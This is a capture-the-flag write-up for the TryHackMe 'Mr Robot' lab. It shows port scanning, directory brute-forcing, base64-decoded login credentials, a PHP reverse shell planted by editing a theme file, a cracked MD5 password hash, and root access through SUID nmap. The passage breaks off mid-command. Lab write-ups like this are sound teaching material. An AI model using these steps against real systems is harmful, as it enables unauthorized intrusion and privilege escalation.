# Mr Robot CTF [Writeup]

One of the top-tier challenges on TryHackMe, revered as a GOAT in THM Machines.

Released: 2024-03-3

## Foreword

I've come to understand that many people don't grasp my write-ups due to a knowledge gap. Therefore, I'll be explaining every step along the way. Hope you enjoy as I spend a lot of time on these writeups!

## Nmap Scan

- What is Nmap? Nmap is a tool used for checking open ports in a server. This is typically the first step when tackling a machine and that is what I am doing below.

```bash
â”Œâ”€â”€(vipinã‰¿vipin)-[~]
â””â”€$ sudo nmap -sS -sV 10.10.199.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 23:06 EST
Nmap scan report for 10.10.199.158
Host is up (0.097s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.96 seconds
```

- We now know that there is a closed SSH port, an open HTTP port indicating the presence of a website accessible through a browser, and port 443 running both SSL and HTTP.

## Accessing the website

- Wow, most rooms don't have such a well built challenge site. After some poking and prodding, I don't seem to see anything on the homepage. Next step is Dirsearch...

## Dirsearch

- A **Directory Search** involves brute-forcing to discover existing directories, helping you understand your attack surface.

```bash
â”€â”€(vipinã‰¿vipin)-[~]
â””â”€$ dirsearch -u 10.10.199.158 --exclude-status 301,400,403,404,408

## Key 1

- Looking through all the directories we found with **Dirsearch**, in *robots.txt* has the first key for us

![Image showing the robots.txt](blog/mrrobotctf/robotstxt.png 'Fig.2')
<div style={{ textAlign: 'center' }}>
  <small>Fig.2</small>
</div>

## Key 2

- When we look in */license*, we find the string "ZWxsaW90OkVSMjgtMDY1Mgo=", it seems to be base64 (A type of encoding).

![Image showing the output](blog/mrrobotctf/base64output.png 'Fig.3')
<div style={{ textAlign: 'center' }}>
  <small>Fig.3</small>
</div>

- Let's login with those credentials */login*

- And we are in! Lets exploit it...

- I started by using [this **PHP Reverse Shell** script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and editing the 404 theme file with the PHP code and I got user access!

```bash
daemon@linux:/$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

- Ruh roh, can't go in. Lets crack that password though.

![Image showing cracked password](blog/mrrobotctf/hashcracked.png 'Fig.5')

```bash
daemon@linux:/$ su robot
su robot
su: must be run from a terminal
daemon@linux:/$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz             
```

- And I did get the key after logging in as *`robot`*

## Key 3

- I ran ```find / -user root -perm -4000 -exec ls -ldb {} \;``` to see exploitable SUID Binaries (These are binaries/programs that have `sudo` permissions) and NMAP was one of the results. Using GTFOBINS I found that you can run ```nmap --interactive``` and also run  ```!sh``` to get a root shell. 

```bash
robot@linux:/$ nmap --interactive               
nmap --interactive
